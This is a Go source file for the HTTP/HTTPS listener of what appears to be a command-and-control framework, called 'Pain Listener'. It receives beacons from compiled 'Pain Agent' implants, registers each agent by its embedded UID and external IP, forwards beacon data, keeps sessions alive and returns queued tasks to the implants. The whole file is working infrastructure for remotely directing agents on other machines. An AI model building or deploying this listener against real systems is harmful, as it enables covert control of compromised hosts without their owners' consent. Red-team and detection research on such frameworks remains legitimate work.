package main

import (
	"fmt"
	"io"
	"net"
	"net/http"
)

// startHTTP binds the server and starts serving in a goroutine.
// If l.Config.Ssl is true, TLS is used; cert/key are auto-generated when not provided.
func (l *HTTPListener) startHTTP() error {
	mux := http.NewServeMux()
	mux.HandleFunc("/", l.handleRequest)

	l.server = &http.Server{
		Addr:    fmt.Sprintf("%s:%d", l.Config.Host, l.Config.Port),
		Handler: mux,
	}

	scheme := "http"
	if l.Config.Ssl {
		certPath, keyPath, err := ensureCert(
			l.Config.CertFile, l.Config.KeyFile,
			ListenerDataDir, l.Name,
		)
		if err != nil {
			return fmt.Errorf("TLS setup failed: %w", err)
		}
		scheme = "https"
		go func() {
			if err := l.server.ListenAndServeTLS(certPath, keyPath); err != nil && err != http.ErrServerClosed {
				fmt.Printf("[Pain Listener] TLS server error: %v\n", err)
			}
		}()
	} else {
		go func() {
			if err := l.server.ListenAndServe(); err != nil && err != http.ErrServerClosed {
				fmt.Printf("[Pain Listener] server error: %v\n", err)
			}
		}()
	}

	fmt.Printf("[Pain Listener] listening on %s://%s:%d\n", scheme, l.Config.Host, l.Config.Port)
	return nil
}

// handleRequest processes every POST from the Pain Agent
func (l *HTTPListener) handleRequest(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		w.WriteHeader(http.StatusMethodNotAllowed)
		return
	}

	body, err := io.ReadAll(r.Body)
	if err != nil || len(body) < 36 {
		w.WriteHeader(http.StatusBadRequest)
		return
	}

	// First 36 bytes = agent UID (the UUID Pain embeds at compile time)
	uid := body[:36]
	beat := body[36:]

	// Strip port from RemoteAddr ("1.2.3.4:PORT" → "1.2.3.4")
	externalIP := r.RemoteAddr
	if host, _, splitErr := net.SplitHostPort(r.RemoteAddr); splitErr == nil {
		externalIP = host
	}

	// Look up whether this agent already exists
	agentId, exists := ModuleObject.ts.TsAgentIdByUID(uid)

	// Only to check if beacon is working properly and the random UUID is working
	// fmt.Printf("[Pain Listener] uid=%.36s beat=%d exists=%v\n", uid, len(beat), exists)

	if !exists {
		// Unknown UID with empty body = stale agent polling after a server restart.
		// Its session is gone; ignore silently - it will re-check-in on the next cycle.
		if len(beat) == 0 {
			w.WriteHeader(http.StatusOK)
			return
		}

		// Non-empty beat = first check-in, register the agent
		agentData, err := ModuleObject.ts.TsAgentCreate(
			l.Config.AgentCrc, uid, beat,
			l.Name, externalIP, true,
		)
		if err != nil {
			// Async race: agent was created by the check-in but UID map wasn't ready
			// for the immediately-following poll. Retry lookup once before failing.
			if retryId, found := ModuleObject.ts.TsAgentIdByUID(uid); found {
				agentId = retryId
			} else {
				fmt.Printf("[Pain Listener] TsAgentCreate error: %v\n", err)
				w.WriteHeader(http.StatusInternalServerError)
				return
			}
		} else {
			agentId = agentData.Id
		}
	} else {
		// Agent exists - pass the payload bytes to the agent plugin for processing
		_ = ModuleObject.ts.TsAgentProcessData(agentId, beat)
	}

	// Tick the agent so the teamserver keeps it alive in the Sessions panel
	_ = ModuleObject.ts.TsAgentSetTick(agentId, l.Name)

	// Respond with any pending tasks (empty response = nothing to do)
	tasks, _, err := ModuleObject.ts.TsAgentGetHostedAll(agentId, 1024*1024)
	if err != nil || len(tasks) == 0 {
		w.WriteHeader(http.StatusOK)
		return
	}

	w.WriteHeader(http.StatusOK)
	_, _ = w.Write(tasks)
}
